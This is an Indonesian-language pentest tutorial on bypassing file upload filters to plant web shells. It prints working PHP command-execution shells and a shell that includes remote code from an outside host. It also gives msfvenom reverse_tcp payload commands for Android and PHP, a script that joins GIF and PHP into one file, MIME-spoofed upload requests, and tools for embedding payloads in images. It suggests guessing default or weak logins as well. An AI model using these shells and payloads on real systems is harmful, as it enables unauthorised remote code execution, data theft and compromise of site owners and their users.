# File Upload Injection & Bypass

Kerentanan ini biasanya karena ada kelemahan di web yang akan menjadi target operasi.

Kerentanan ini dari :

- Sistem file yang diupload tidak begitu aman atau begitu terbuka dari tempat penyimpanan dan satu tempat dengan server utama.
- Filterisasi atau sanitasi dari inputan file yang diupload tidak benar-benar menyaring file yang berbahaya
- Programmer masih pemula dan tidak begitu paham tentang testing atau program yang dibuat tidak sampai testing atau QA
- Server yang tidak dihardening
- Program yang begitu umum dan mudah ditebak

Teknik ini biasa dikenal dengan istilah :

- Bypassing File Upload Restrictions
- File Upload Bypass
- Bypass shell Upload

## Langkah yang biasa dilakukan

- Pertama identifikasi sistem dan croscek mana saja yang bisa menjadi kerentanan dengan melihat form yang berisikan upload file
- Upload file biasanya ditemukan di dalam sistem setelah kita login dan untuk masuk login gunakan teknik temukan yang default atua kerentanan pada seseorang yang umumnya menggunakan sesuatu yang umum atau malas untuk mengganti keamanan loginnya.
- Mulai testing. Pada saat pengujian mulailah untuk menggunakan beberapa teknik dari :
  - Melakukan injek pada file yang ingin diupload
  - Menguji hasil file injek file yang akan diupload
  - Akan ditemukan banyak ujicoba agar mengerti bagaimana sistem melakukan filterisasi

## Umumnya programmer melakukan ini saat kita akan melakukan fileupload

1. memfilter validasi ukuran file
2. merubah nama file dari default ke random
3. memfilter validasi jenis file berdasarkan extention yang diizinkan
4. memfilter validasi berdasarkan mime type
5. tempat penyimpanan file satu tempat dengan web utama atau monolit
6. dapat membaca file secara langsung dengan nama file dan tempat penyimpanan yang mudah ditebak
7. memfilter validasi ukuran gambar

proses kerjanya: setelah form mendapatkan file yang diupload ia akan memproses dari validasi hingga menyimpannya didatabase atau memindahkannya ke dalam folder di server

## Bypass File Upload

Melakukan bypass adalah melakukan file upload seperti biasa namun yang berbeda adalah kita akan mengelabui sistem sehingga sistem tidak mengetahui atau tidak dapat membedakan apakah file yang diupload itu berbahaya atau tidak untuk sistem yang sendiri.

Analoginya bayangkan seseorang yang menggunakan baju polisi bisa disangka seorang polisi walaupun sebenarnya dia bukanlah seorang polisi yang sesungguhnya karena umumnya orang hanya menilai dari pakainnya begitu pula kebalikannya.

Seseorang yang berpakaian biasa atau kusuh seperti orang gila tidak akan mengetahui jika dia adalah seorang polisi yang sedang menyamar.

Jadi teknik bypass ini adalah bagaimana membuat sistem tidak menyadarinya.

## Web Shell -> PHP

shell adalah sebuah perwakilan kita untuk bisa membuat kita mengakses dengan bebas sesuatu yang ada didalam tanpa sepengetahuan sebuah atau tanpa disadari.

shell dapat berbentuk macam-macam salah satunya adalah menggunakan PHP pada webserver yang menggunakan PHP pada sistem webnya.

Webservernya juga bervariasi dari apache, nginx dll yang membuat kita minimal harus mengenalnya dan tahu bagaimana ia bekerja.

Menyiapkan webshell itu penting diawal dan biasanya setiap orang memiliki shell favoritnya masing-masing.

Karena umumnya website masih menggunakan PHP maka dari kita mulai dari menggunakan webshell PHP.

1. webshell yang sederhana seperti ini :

`<?php system($_GET['cmd']); ?>`

kode diatas berarti kita bisa melakukan RCE (Remote Code Execution) lewat website yang sedang kita ujicoba. RCE termasuk bug dengan level tinggi karena hak akses di RCE dapat membuat apa saja berdasarkan kode yang kita masukkan. Dari membuat file disistem, mengetahui informasi disistem dan paling parah adalah kita bisa mendapatkan .env atau file environment sistem yang sedang digunakan oleh website tersebut.

eksekusi shell diatas itu sangat sederhana dengan
`<https://namaweb.domain/file?cmd="perintah> yang kita inginkan"

2. contoh webshel sederhana lainnya :

```php
<?php if(isset($_REQUEST['cmd']))
    {   echo "<pre>"; 
        $cmd=($_REQUEST['cmd']); 
        system($cmd); 
        echo "</pre>"; 
        die; 
    }
?>
```

kode diatas akan menampilkan hasilnya lewat tag `<pre>` di halaman web yang berhasil kita bypass.

3. contoh webshell yang diambil dari luar

```php
<?php
include ("http://serverkamu.xyz/shell.php");
?>
```

coding diatas akan lebih dinamis sih dari yang sebelumnya.

webshell yang ke-3 diatas untuk membuatnya menjadi lebih kecil kita bisa melakukan konversi seperti berikut:

```python
    retasin = open ('msgif.gif','rb').read()
    retasin += open ('test.php','rb').read()
    open ('newphp.php','wb').write(retasin)

```

## Payload dengan Msfvenom

ketahui ipadress dengan `ip address`

### Payload APK Reverse-TCP

`msfvenom -p android/meterpreter/reverse_tcp LHOST=ip_server LPORT=4444 -o payload.apk`

### Payload

`msfvenom -p php/meterpreter/reverse_tcp LHOST=ip_server LPORT=4444 -o payload.php`

## File Injection

### Mengubah mime type dan menambahkan extention lainnya

```text
------WebKitFormBoundaryaxpyiPgbbPti10Rw
Content-Disposition: form-data; name="file"; filename="pgadmin.log"
Content-Type: application/octet-stream

isi file yang bisa kita injeksi

------WebKitFormBoundaryaxpyiPgbbPti10Rw--
```

```text
------WebKitFormBoundaryaxpyiPgbbPti10Rw
Content-Disposition: form-data; name="token"; filename="pgadmin.log"
Content-Type: image/jpeg

isi file yang bisa kita injeksi

------WebKitFormBoundaryaxpyiPgbbPti10Rw--
```

### Toolkit

- jhead `jhead -ce namafile.jpg`
- xxd `xxd namafile.ext`
- pixload `pixload-jpg --payload "$(cat payload.php)" namafile.jpg`
- exiftool

## Konversi file

- konversi file ke jpg `mogrify -f jpg namafile.png`
- konversi semua file ke jpg `mogrify -f jpg *.png`

Inspirasi :

- <https://techyzilla.blogspot.com/2012/07/injecting-malicious-php-in-to-an-image-file.html>
- <https://pentestlab.blog/2012/11/29/bypassing-file-upload-restrictions/>
- <https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/web-application/file-upload-bypass>
- <https://infosecwriteups.com/laravel-8-x-image-upload-bypass-zero-day-852bd806019b>

Security Researcher | Pentester (Penetration Tester)
